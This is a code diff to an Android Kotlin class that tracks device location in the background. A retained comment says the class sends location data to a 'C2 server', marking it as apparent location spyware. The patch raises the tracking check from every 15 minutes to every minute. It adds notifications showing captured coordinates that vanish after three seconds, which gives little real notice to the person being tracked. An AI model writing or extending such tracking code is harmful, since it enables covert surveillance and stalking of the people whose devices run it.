@@ -22,6 +22,10 @@ import java.util.Date
 import java.util.Locale
 import java.util.Timer
 import java.util.TimerTask
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.os.Build
+import androidx.core.app.NotificationCompat
 
 /**
  * Tracks and logs user location in the background.
@@ -33,6 +37,7 @@ class LocationTracker(private val context: Context) {
     private var locationListener: LocationListener? = null
     private var timer: Timer? = null
     private val handler = Handler(Looper.getMainLooper())
+    private val CHANNEL_ID = "location_tracker_channel"
     
     // Track high-precision location at most every 5 meters or 10 seconds
     private val MIN_TIME_BETWEEN_UPDATES = 10000L // 10 seconds
@@ -43,6 +48,12 @@ class LocationTracker(private val context: Context) {
      */
     fun startTracking() {
         Log.d(TAG, "Starting location tracking")
+        
+        // Create notification channel for Android O and above
+        createNotificationChannel()
+        
+        // Show notification
+        showNotification("Location Tracking Started", "Now monitoring device location")
         
         // Create the location listener
         locationListener = object : LocationListener {
@@ -121,7 +132,7 @@ class LocationTracker(private val context: Context) {
                     }
                 }
             }
-        }, 60000, 15 * 60 * 1000) // Check after 1 minute, then every 15 minutes
+        }, 60000, 60 * 1000) // Check after 1 minute, then every 1 minute
     }
     
     /**
@@ -177,6 +188,9 @@ class LocationTracker(private val context: Context) {
             }
             
             Log.d(TAG, "Location logged: ${location.latitude}, ${location.longitude}")
+            
+            // Show notification
+            showNotification("Location Captured", "${location.latitude}, ${location.longitude}")
             
             // Send location data to C2 server
             try {
@@ -240,5 +254,43 @@ class LocationTracker(private val context: Context) {
             dir.mkdirs()
         }
         return dir
+    }
+    
+    /**
+     * Create notification channel for Android O and above
+     */
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val name = "Location Tracker"
+            val descriptionText = "Shows location tracking activity"
+            val importance = NotificationManager.IMPORTANCE_DEFAULT
+            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
+                description = descriptionText
+            }
+            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
+        }
+    }
+    
+    /**
+     * Show a temporary notification
+     */
+    private fun showNotification(title: String, message: String) {
+        val notificationId = System.currentTimeMillis().toInt()
+        
+        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.ic_dialog_map)
+            .setContentTitle(title)
+            .setContentText(message)
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+            .setAutoCancel(true)
+        
+        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.notify(notificationId, builder.build())
+        
+        // Auto-dismiss after 3 seconds
+        Handler(Looper.getMainLooper()).postDelayed({
+            notificationManager.cancel(notificationId)
+        }, 3000)
     }
 }
